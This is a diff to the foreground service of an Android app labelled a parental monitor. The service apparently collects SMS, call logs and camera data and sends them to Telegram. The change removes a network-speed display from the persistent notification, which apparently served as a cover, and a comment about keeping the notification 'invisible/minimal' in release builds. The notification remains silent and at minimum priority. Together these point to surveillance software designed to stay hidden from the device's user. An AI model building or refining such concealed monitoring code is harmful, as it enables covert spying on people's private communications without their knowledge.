@@ -15,7 +15,6 @@ import com.redeye.parentalmonitor.network.TelegramMessage
 import com.redeye.parentalmonitor.utils.CrashReporter
 import com.redeye.parentalmonitor.utils.Html
 import com.redeye.parentalmonitor.utils.MessageScheduler
-import com.redeye.parentalmonitor.utils.NetSpeed
 import com.redeye.parentalmonitor.repository.CallLogRepository
 import com.redeye.parentalmonitor.repository.SmsRepository
 import com.redeye.parentalmonitor.utils.NetworkUtils
@@ -85,13 +84,7 @@ class MonitoringService : Service() {
     private var cachedMonitoringPaused = false
     private var cachedPhotoPausedUntil = 0L
     private var cachedSyncInterval = -1
-    private var speedJob: Job? = null
-    private var lastRxBytes = -1L
-    private var lastTxBytes = -1L
-    private var lastSpeedAt = 0L
-    private var lastSpeedText = ""
-    private var cachedSpeedTap: android.app.PendingIntent? = null
-    private var cachedSpeedTitle = ""
+    private var cachedSetupTap: android.app.PendingIntent? = null
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
@@ -211,7 +204,7 @@ class MonitoringService : Service() {
             }
         } catch (_: Exception) {
         }
-        if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && loopWatchdogJob?.isActive == true && speedJob?.isActive == true) {
+        if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && loopWatchdogJob?.isActive == true) {
             refreshCreds()
             return
         }
@@ -227,11 +220,10 @@ class MonitoringService : Service() {
         refreshCreds()
         refreshLoopConfig()
 
-        // In RELEASE mode, make notification invisible/minimal
         val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
             .setSmallIcon(R.drawable.ic_notification)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setContentIntent(speedTapIntent())
+            .setContentIntent(setupTapIntent())
             .setOngoing(true)
         
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
@@ -283,8 +275,7 @@ class MonitoringService : Service() {
             }
         }
         isRunning = true
-        startSpeedTracking()
-        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started")
         if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
             serviceScope.launch {
                 sendToTelegram("Storage fallback active: secure storage unavailable, data kept in volatile memory until Setup is reopened.")
@@ -1455,86 +1446,10 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun speedTapIntent(): android.app.PendingIntent {
-        cachedSpeedTap?.let { return it }
-        val intent = android.content.Intent(this, com.redeye.parentalmonitor.ui.SpeedMonitorActivity::class.java).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
-        return android.app.PendingIntent.getActivity(this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE).also { cachedSpeedTap = it }
-    }
-
-    private fun speedTitle(): String {
-        if (cachedSpeedTitle.isEmpty()) {
-            cachedSpeedTitle = try {
-                getString(R.string.notification_title)
-            } catch (_: Exception) {
-                ""
-            }
-        }
-        return cachedSpeedTitle
-    }
-
-    private fun startSpeedTracking() {
-        stopSpeedTracking()
-        lastRxBytes = -1L
-        lastTxBytes = -1L
-        lastSpeedAt = 0L
-        lastSpeedText = ""
-        speedJob = serviceScope.launch {
-            while (isActive && speedJob === coroutineContext[Job]) {
-                try {
-                    refreshSpeedNotification()
-                } catch (e: kotlinx.coroutines.CancellationException) {
-                    throw e
-                } catch (_: Exception) {
-                }
-                delay(5_000L)
-            }
-        }
-    }
-
-    private fun refreshSpeedNotification() {
-        val totals = NetSpeed.totals()
-        val rx = totals.first
-        val tx = totals.second
-        if (rx < 0 || tx < 0) return
-        val now = android.os.SystemClock.elapsedRealtime()
-        if (lastRxBytes >= 0 && lastTxBytes >= 0 && now > lastSpeedAt) {
-            val dt = (now - lastSpeedAt).coerceAtLeast(1) / 1000.0
-            val down = ((rx - lastRxBytes).coerceAtLeast(0) / dt).toLong()
-            val up = ((tx - lastTxBytes).coerceAtLeast(0) / dt).toLong()
-            val text = "\u2193 " + NetSpeed.formatRate(down) + " \u00b7 \u2191 " + NetSpeed.formatRate(up)
-            if (text != lastSpeedText) {
-                lastSpeedText = text
-                try {
-                    val notification = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
-                        .setSmallIcon(R.drawable.ic_notification)
-                        .setContentTitle(speedTitle())
-                        .setContentText(text)
-                        .setContentIntent(speedTapIntent())
-                        .setPriority(NotificationCompat.PRIORITY_MIN)
-                        .setOngoing(true)
-                        .setSilent(true)
-                        .setShowWhen(false)
-                        .setOnlyAlertOnce(true)
-                        .build()
-                    val manager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
-                    manager.notify(NOTIFICATION_ID, notification)
-                } catch (_: Exception) {
-                }
-            }
-        }
-        lastRxBytes = rx
-        lastTxBytes = tx
-        lastSpeedAt = now
-    }
-
-    private fun stopSpeedTracking() {
-        try {
-            speedJob?.cancel()
-        } catch (_: Exception) {
-        }
-        speedJob = null
-        cachedSpeedTap = null
-        cachedSpeedTitle = ""
+    private fun setupTapIntent(): android.app.PendingIntent {
+        cachedSetupTap?.let { return it }
+        val intent = android.content.Intent(this, com.redeye.parentalmonitor.ui.SetupActivity::class.java).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
+        return android.app.PendingIntent.getActivity(this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE).also { cachedSetupTap = it }
     }
 
     private suspend fun sendInitialData() {
@@ -2078,7 +1993,7 @@ class MonitoringService : Service() {
         initialSyncRunning.set(false)
         initialSyncStarted.set(false)
         idlePolls = 0
-        stopSpeedTracking()
+        cachedSetupTap = null
         isRunning = false
         try {
             loopWatchdogJob?.cancel()
@@ -2165,10 +2080,6 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         try {
-            speedJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
             loopWatchdogJob?.cancel()
         } catch (_: Exception) {
         }
@@ -2204,7 +2115,7 @@ class MonitoringService : Service() {
             cameraService.forceReset()
         } catch (_: Exception) {
         }
-        stopSpeedTracking()
+        cachedSetupTap = null
         isRunning = false
         super.onDestroy()
         serviceScope.cancel()
@@ -2427,8 +2338,8 @@ class MonitoringService : Service() {
             val notification = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
                 .setSmallIcon(R.drawable.ic_notification)
                 .setContentTitle(getString(R.string.notification_title))
-                .setContentText(if (lastSpeedText.isEmpty()) getString(R.string.notification_text) else lastSpeedText)
-                .setContentIntent(speedTapIntent())
+                .setContentText(getString(R.string.notification_text))
+                .setContentIntent(setupTapIntent())
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setOngoing(true)
                 .setSilent(true)
